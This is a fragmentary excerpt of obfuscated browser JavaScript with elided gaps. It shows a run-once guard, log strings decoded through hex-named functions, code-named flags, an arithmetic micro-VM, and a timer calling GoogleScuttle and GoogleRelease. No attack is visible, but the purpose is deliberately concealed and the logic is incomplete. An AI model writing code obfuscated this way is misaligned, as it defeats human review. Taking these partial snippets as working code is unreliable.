  ...
  const _0x5c1e = Symbol.for("_0xqf5c480b0");
  if (window[_0x5c1e]) {
  ...
  (async () => {
    try {
      ...
      Log.say(_0xlex.C(1), _0xlex.P(53,[_0xed(1888),_0xed(1907),_0xed(1926),_0xed(1943),_0xed(1963),_0xed(1984),_0xed(2002),_0xed(2021),_0xed(2038),_0xed(2058),_0xed(2074),_0xed(2091),_0xed(2109),_0xed(2127),_0xed(2146)]) + JSON.stringify({
        lotus: !!_0x3, sedge: !!_0x4, quill: !!_0x5, onyx: !!_0x6, cairn: !!_0x7, pine: !!_0x8, birch: !!_0x9
      }));
      ...
      const _0xvmExec = (prog, vars) => { // gated-arithmetic micro-VM (refill count, activity deadline)
        const st = []; const vs = Object.assign({}, vars);
        for (let i = 0; i < prog.length; i++) {
          const op = prog[i];
          if (op === 0x01) st.push(prog[++i]);
          else if (op === 0x02) st.push(vs[prog[++i]]);
          else if (op === 0x03) st.push(st.pop() + st.pop());
          else if (op === 0x04) { const b = st.pop(), a = st.pop(); st.push(a - b); }
          else if (op === 0x05) st.push(st.pop() * st.pop());
          else if (op === 0x09) vs[prog[++i]] = st.pop();
          else if (op === 0x0D) st.push(Math.max(st.pop(), st.pop()));
          else if (op === 0x0F) return st.pop();
          else throw new Error('vm-op');
        }
        return st.pop();
      };
...
try { MemberCount.summary(); } catch (e) {}
      ...
      try {
        ...
        _0xbootTimer = setTimeout(() => { try { window.removeEventListener("message", _0xboot); } catch (e) {} GoogleScuttle(); GoogleRelease(); try { _0xmod.host?.shut?.(); } catch (e) {} _0xbootTimer = null; }, 17000);
